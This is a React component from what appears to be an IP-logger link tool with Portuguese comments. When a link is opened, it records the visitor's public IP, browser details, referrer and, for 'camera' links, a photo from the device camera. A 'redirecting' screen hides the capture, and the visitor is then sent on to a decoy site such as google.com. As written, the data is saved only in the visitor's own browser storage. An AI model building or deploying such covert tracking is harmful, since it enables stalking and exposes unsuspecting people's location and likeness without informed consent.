
import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import CameraCapture from './CameraCapture';

interface AccessData {
  id: string;
  timestamp: string;
  ip: string;
  userAgent: string;
  referrer: string;
  type: 'link' | 'pixel';
  linkId?: string;
  linkType?: 'ip' | 'camera';
  photo?: string;
}

const RedirectHandler: React.FC = () => {
  const { linkId } = useParams<{ linkId: string }>();
  const [showCamera, setShowCamera] = useState(false);
  const [linkType, setLinkType] = useState<'ip' | 'camera'>('ip');
  const [redirectUrl, setRedirectUrl] = useState('https://google.com');

  useEffect(() => {
    if (linkId) {
      // Verificar tipo de link
      const savedLinks = localStorage.getItem('iplogger-links');
      const links = savedLinks ? JSON.parse(savedLinks) : {};
      const linkData = links[linkId];
      
      if (linkData) {
        setLinkType(linkData.type || 'ip');
        setRedirectUrl(linkData.redirectUrl || 'https://google.com');
        
        if (linkData.type === 'camera') {
          setShowCamera(true);
        } else {
          captureAccess();
        }
      } else {
        captureAccess();
      }
    }
  }, [linkId]);

  const captureAccess = async (photoData?: string) => {
    try {
      // Capturar IP real usando um serviço público
      let realIP = 'IP não disponível';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        realIP = ipData.ip;
      } catch (error) {
        console.log('Não foi possível obter IP externo, usando localhost');
        realIP = 'localhost';
      }

      const newAccess: AccessData = {
        id: Date.now().toString(),
        timestamp: new Date().toISOString(),
        ip: realIP,
        userAgent: navigator.userAgent,
        referrer: document.referrer || 'Acesso Direto',
        type: 'link',
        linkId: linkId,
        linkType: linkType,
        photo: photoData
      };

      // Salvar no localStorage
      const savedData = localStorage.getItem('iplogger-data');
      const existingData: AccessData[] = savedData ? JSON.parse(savedData) : [];
      const updatedData = [...existingData, newAccess];
      localStorage.setItem('iplogger-data', JSON.stringify(updatedData));

      console.log('Acesso capturado:', newAccess);

      // Redirecionar após um pequeno delay
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 1000);

    } catch (error) {
      console.error('Erro ao capturar acesso:', error);
      // Redirecionar mesmo em caso de erro
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 1000);
    }
  };

  const handlePhotoCapture = (photoData: string) => {
    console.log('Foto capturada com sucesso');
    setShowCamera(false);
    captureAccess(photoData);
  };

  const handleCameraError = (error: string) => {
    console.error('Erro na câmera:', error);
    setShowCamera(false);
    // Continuar com captura normal mesmo sem foto
    captureAccess();
  };

  return (
    <>
      <div className="min-h-screen bg-gray-900 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-400 mx-auto mb-4"></div>
          <p className="text-white">
            {showCamera ? 'Preparando câmera...' : 'Redirecionando...'}
          </p>
        </div>
      </div>
      
      {showCamera && (
        <CameraCapture
          onPhotoCapture={handlePhotoCapture}
          onError={handleCameraError}
        />
      )}
    </>
  );
};

export default RedirectHandler;
